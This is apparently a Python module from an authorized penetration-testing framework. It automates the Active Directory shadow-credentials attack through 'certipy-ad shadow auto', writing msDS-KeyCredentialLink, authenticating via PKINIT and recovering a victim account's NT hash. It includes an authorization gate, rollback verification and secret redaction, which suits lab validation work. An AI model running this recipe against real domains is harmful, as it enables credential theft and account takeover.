"""Shadow-credentials validation executor -- FULL (T1b).

Encodes the PROVEN SHADOW-CREDS recipe (claude-mem #66146), parameterized and
*mutating* (msDS-KeyCredentialLink is written, so a VERIFIED rollback is
required -- here certipy performs it itself):

    certipy-ad shadow auto -account <victim> -u <op>@<dom> -p <pw> -dc-ip <dc>

``shadow auto`` adds a Key Credential to the victim's msDS-KeyCredentialLink,
authenticates via PKINIT, recovers the victim's NT hash, and then auto-restores
the original attribute. The terminal proof is ``secret_recovered`` (the NT hash
was recovered); the rollback is the attribute restore, and its success marker
sets ``rollback.verified``.

The recovered NT hash is a SECRET: it is held only in the private reveal
artifact, never stored in a step note or placed in the receipt (``proof.scrub`` also drops any
hash-marked key defensively). The terminal fact's token is over public
identifiers only (technique, domain, victim account).

Scoring identity (ad-lab-harness ``truth/GOAD-proof.json``): SHADOW-CREDS keys on
``{domain}``. ``target_identity`` returns the domain (plus the victim account for
information -- an extra attribute that does not affect the subset match).

UNVERIFIED ASSUMPTION (pin against the real tool during the lab run, mirroring
laps.py): certipy's ``shadow auto`` success markers -- a hash-recovery line
(``Got hash for`` / ``NT hash`` / an ``aad3b...:<nt>`` blob) and a restore line
(``Restoring the old Key Credentials`` / ``Successfully restored``). If the real
wording differs, the chain gets no positive predicate / no verified rollback and
honestly reports not-proved/inconclusive -- it never fabricates a recovery.
"""
from __future__ import annotations

import re
from pathlib import Path
from typing import Any

from ..recommend import ParamSpec, ParamValue, values
from .. import proof
from ._reveal_common import pkinit_hashes
from .base import (SecretReveal, ValidationExecutor, ExecutorContext, StepRecord, RunResult,
                   redact_argv)


# Shadow-auto proof markers; secret capture is separate from this predicate.
_RE_SHADOW_HASH = re.compile(
    r"(Got hash for|NT hash for '[^']+':|[0-9a-f]{32}:[0-9a-f]{32})", re.I)
# shadow-auto restore markers -- PAST-TENSE SUCCESS ONLY. certipy prints the
# in-progress "Restoring the old Key Credentials" line BEFORE performing the LDAP
# restore, so matching it would report a verified rollback on a restore that then
# failed (leaving msDS-KeyCredentialLink modified). Match only confirmed success.
_RE_SHADOW_RESTORE = re.compile(
    r"(Successfully restored|Restored the old Key Credentials?|"
    r"Key Credentials? (were )?restored)", re.I)


def _short_name(host: str) -> str:
    """The computer sAMAccountName root for a host (short DNS label)."""
    return (host or "").split(".", 1)[0]


class ShadowCredsExecutor(ValidationExecutor):
    recovers_credentials = True
    technique = "SHADOW-CREDS"
    technique_class = "shadow_creds"
    terminal_kind = "secret_recovered"
    mutating = True
    verified_recipe = True
    recipe_ref = ("#66146 SHADOW-CREDS = certipy-ad shadow auto -account <victim$> "
                  "(add msDS-KeyCredentialLink -> PKINIT -> NT hash -> auto-restore) "
                  "(PROVED braavos$)")

    # ---------------------------------------------------------------- params
    def param_specs(self, ctx: ExecutorContext, finding) -> list[ParamSpec]:
        host = finding.host or ""
        # Default victim: the computer account for the finding host (<shortname>$).
        # A host without a resolvable short label falls back to a placeholder the
        # operator overrides.
        victim = f"{_short_name(host)}$" if host else ""
        return [
            ParamSpec(
                name="account", kind="target_host",
                description="The victim account whose msDS-KeyCredentialLink is "
                            "written (and restored). Defaults to the finding host's "
                            "computer account (<shortname>$); override for a user "
                            "account or a specific machine.",
                recommended=victim,
                rationale="The computer account derived from the aranum "
                          "shadow-credentials finding host (#66142 override model).",
                required=True,
            ),
        ]

    def target_identity(self, ctx, finding, params: dict[str, ParamValue]) -> dict[str, Any]:
        # SHADOW-CREDS facet keys on {domain}; the victim account is carried for
        # information only (an extra attribute does not change the subset match).
        identity: dict[str, Any] = {"domain": ctx.config.domain}
        account = params["account"].value if "account" in params else None
        if account:
            identity["account"] = account
        return identity

    def steps_preview(self, ctx, finding, params) -> list[str]:
        v = values(params)
        dc = ctx.config.dc_ip
        return [
            f"certipy-ad shadow auto -account {v['account']} "
            f"-u <op>@{ctx.config.domain} -p *** -dc-ip {dc}   "
            "(add KeyCredentialLink -> PKINIT -> NT hash -> auto-restore)",
        ]

    # ---------------------------------------------------------------- auth argv
    def _op_auth_argv(self, cfg) -> list[str]:
        """certipy operator-auth flags: ``-u op@dom`` plus the secret flag."""
        argv = ["-u", f"{cfg.username or ''}@{cfg.domain}"]
        if cfg.nt_hash:
            argv += ["-hashes", cfg.nt_hash]
        elif cfg.aes_key:
            argv += ["-aesKey", cfg.aes_key]
        elif cfg.password is not None:
            argv += ["-p", cfg.password]
        return argv

    # ---------------------------------------------------------------- execute
    def revealed_secrets(self, artifact: dict) -> list[SecretReveal]:
        return list(artifact.get("_reveal", []))

    def execute(self, ctx: ExecutorContext, finding, params: dict[str, ParamValue]) -> dict:
        # Private recovery channel, populated before downstream proof/cleanup.
        artifact = {"_reveal": []}
        ctx._pending_reveal_artifact = artifact

        def finish_artifact(*args):
            artifact.update(self._artifact(*args))
            return artifact

        cfg = ctx.config
        v = values(params)
        account = v["account"]
        dc = cfg.dc_ip
        out_dir = Path(ctx.output_dir)
        out_dir.mkdir(parents=True, exist_ok=True)

        steps: list[StepRecord] = []
        errors: list[str] = []
        gate = {"classifier": "not_required", "op": None}
        mutation = {"applied": False,
                    "rollback": {"performed": False, "method": None, "verified": False}}

        def record(name, argv, res, ok, note=""):
            steps.append(StepRecord(name=name, ok=ok, argv_display=redact_argv(argv),
                                    returncode=res.returncode, note=note))

        # 1) shadow auto (mutating: writes msDS-KeyCredentialLink, gated) -----
        verdict = ctx.authorizer.authorize("shadow_write", {"account": account})
        if verdict == "denied":
            gate["classifier"] = "denied"
            gate["op"] = "shadow_write"
            errors.append("gate_denied:shadow_write")
            return finish_artifact(steps, gate, mutation, None, False, errors)
        if verdict == "approved":
            gate["classifier"] = "approved"
            gate["op"] = "shadow_write"

        shadow_argv = ["certipy-ad", "shadow", "auto", "-account", account,
                       *self._op_auth_argv(cfg), "-dc-ip", dc]
        res = ctx.runner.run(shadow_argv, timeout=cfg.tool_timeout_s, cwd=str(out_dir))
        out = (res.stdout or "") + (res.stderr or "")
        artifact["_reveal"].extend(pkinit_hashes(self.technique, account, out))
        # Proof remains a public presence predicate.
        hash_ok = bool(_RE_SHADOW_HASH.search(out))
        restore_ok = bool(_RE_SHADOW_RESTORE.search(out))
        record("shadow_auto", shadow_argv, res, hash_ok,
               note="hash recovered" if hash_ok else "no hash recovered")

        # shadow auto writes (and self-restores) the attribute -> mutation applied.
        mutation["applied"] = True
        mutation["rollback"]["performed"] = True
        mutation["rollback"]["method"] = "certipy shadow auto self-restore"
        mutation["rollback"]["verified"] = restore_ok
        if not restore_ok:
            errors.append("rollback_unverified")

        if not hash_ok:
            errors.append("shadow_no_hash")
            return finish_artifact(steps, gate, mutation, None, False, errors)

        terminal_fact = proof.build_terminal_fact(
            self.terminal_kind, ok=hash_ok,
            predicate=(f"recovered the NT hash of {account} in {cfg.domain} via "
                       "shadow credentials (msDS-KeyCredentialLink + PKINIT)"),
            proof_token=proof.proof_token("SHADOW-CREDS", cfg.domain, account,
                                          "hash_recovered"),
            extra={"account": account},
        )
        complete = hash_ok
        return finish_artifact(steps, gate, mutation, terminal_fact, complete, errors)

    @staticmethod
    def _artifact(steps, gate, mutation, terminal_fact, complete, errors) -> dict:
        return {"steps": [s.as_step() for s in steps], "gate": gate,
                "mutation": mutation, "terminal_fact": terminal_fact,
                "complete": complete, "errors": errors}
